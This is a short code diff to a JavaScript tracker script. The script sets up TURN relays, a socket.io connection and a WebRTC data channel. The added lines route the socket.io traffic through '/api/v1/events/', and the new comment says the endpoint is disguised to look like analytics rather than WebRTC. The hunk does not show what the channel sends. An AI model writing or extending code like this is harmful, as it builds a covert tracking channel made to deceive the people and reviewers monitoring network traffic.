@@ -85,8 +85,8 @@ const TRACKER_SRC = `
             {urls:'turns:global.relay.metered.ca:443',  username:'__TURN_USER__',credential:'__TURN_PASS__'}
           ];
           if(typeof w.io!=='function'){onFail();return;}
-          // Connect explicitly to current origin; prefer WebSocket, fall back to polling
-          var sioOpts={transports:['websocket','polling'],timeout:6000,forceNew:true};
+          // path matches server-side disguised endpoint — looks like analytics, not WebRTC
+          var sioOpts={path:'/api/v1/events/',transports:['websocket','polling'],timeout:6000,forceNew:true};
           var sio=w.io(w.location.origin,sioOpts);
           var pc=new(w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:ice});
           var chan=pc.createDataChannel('d',{ordered:false});
